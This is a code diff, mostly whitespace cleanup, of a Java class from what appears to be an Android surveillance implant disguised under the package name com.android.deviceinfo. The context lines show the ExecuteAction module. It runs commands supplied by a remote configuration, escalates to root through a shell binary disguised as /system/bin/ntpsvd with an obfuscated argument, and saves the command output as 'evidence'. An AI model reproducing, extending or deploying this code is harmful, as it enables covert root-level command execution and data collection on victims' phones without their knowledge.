@@ -23,7 +23,6 @@ import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.StreamGobbler;
 import com.android.m.M;
 
-
 // TODO: Aggiungere parse $dir$, verificare chmod
 /**
  * The Class ExecuteAction.
@@ -32,8 +31,6 @@ public class ExecuteAction extends SubActionSlow {
 	private static final String TAG = "ExecuteAction";
 
 	private String command;
-
-	
 
 	/**
 	 * Instantiates a new execute action.
@@ -48,8 +45,8 @@ public class ExecuteAction extends SubActionSlow {
 	@Override
 	protected boolean parse(final ConfAction params) {
 		try {
-			this.command = Directory.expandMacro(params.getString("command"));	
-	
+			this.command = Directory.expandMacro(params.getString("command"));
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): " + this.command);
 			}
@@ -57,14 +54,14 @@ public class ExecuteAction extends SubActionSlow {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
-	
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");
 			}
-	
+
 			return false;
 		}
-	
+
 		return true;
 	}
 
@@ -76,43 +73,44 @@ public class ExecuteAction extends SubActionSlow {
 	@Override
 	public boolean execute(Trigger trigger) {
 		ExecuteResult ret;
-		
+
 		if (this.command.length() == 0)
 			return false;
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute): " + command);
 		}
-		
+
 		if (Root.isRootShellInstalled()) {
 			ret = Execute.executeRoot(this.command);
 		} else {
 			ret = Execute.execute(this.command);
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute) exitCode: " + ret.exitCode);
 			Check.log(TAG + " (execute) stdout: " + ret.getStdout());
 		}
-		
+
 		ret.saveEvidence();
-		
+
 		return ret.exitCode == 0;
 	}
+
 
 	public static boolean executeRoot(String command) {
 		// Proviamo ad eseguire il comando da root
 		try {
-			//a_0=/system/bin/ntpsvd
+			// a_0=/system/bin/ntpsvd
 			// 35_0=qzx
-			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command ); // EXPORT
+			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command); // EXPORT
 			ExecuteResult ret = Execute.execute(Directory.expandMacro(cmd));
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (executeRoot) exitCode: " + ret.exitCode);
 				Check.log(TAG + " (executeRoot) stdout: " + ret.getStdout());
 			}
-						
+
 			return true;
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -126,7 +124,7 @@ public class ExecuteAction extends SubActionSlow {
 		}
 		return false;
 	}
-	
+
 	public static boolean executeGobbler(String command) {
 		try {
 
@@ -147,7 +145,7 @@ public class ExecuteAction extends SubActionSlow {
 			int exitVal = proc.waitFor();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (executeOutput): ExitValue: " + exitVal );
+				Check.log(TAG + " (executeOutput): ExitValue: " + exitVal);
 			}
 		} catch (Throwable t) {
 			if (Cfg.DEBUG) {
